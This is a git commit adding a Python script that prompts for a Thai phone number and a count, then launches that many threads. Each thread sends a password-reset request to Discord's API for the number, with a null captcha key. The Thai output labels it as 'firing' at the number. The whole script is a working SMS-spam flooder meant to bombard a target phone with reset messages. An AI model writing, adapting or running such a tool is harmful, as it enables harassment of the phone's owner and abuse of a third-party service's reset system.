e387be1cf8dd3e70d88725254807af1441bc741a
ZeroN2 <42255304+ZeroN2@users.noreply.github.com>
2022-09-03 21:28:25 +0700

    Add files via upload

---
+++ main.py
@@ -0,0 +1,43 @@
+from requests import post, Session
+from re import search
+from random import choice
+from string import ascii_uppercase, digits
+from concurrent.futures import ThreadPoolExecutor
+from discord.ext import commands
+import discord
+from discord.ext.commands import Bot
+import asyncio
+import threading
+import requests
+import os
+
+
+os.system("clear")
+phone = int(input("Phone : "))
+amount = int(input("Amount : "))
+
+
+def spam1():
+	url = "https://discord.com/api/v9/auth/forgot"
+	data = {"login": f"+66{phone}","captcha_key": "null"}
+	r = requests.post(url, json=data)
+	print(r.status_code)
+	
+	
+
+def run(phone, amount):
+	for _ in range(int(amount)):
+		threading.Thread(target=spam1).start()
+		
+def main():
+	
+	if phone < 1000000000:
+		print(f"้เริ่มยิ่งที่เบอร์ : {phone}")
+		print(f"จำนวนรอบ : {amount}")
+		run(phone, amount)
+	else:
+		print("เบอร์ไม่ควรเกิน 10 หลัก")
+		
+		
+start = input("Ready !!!")
+start = main()
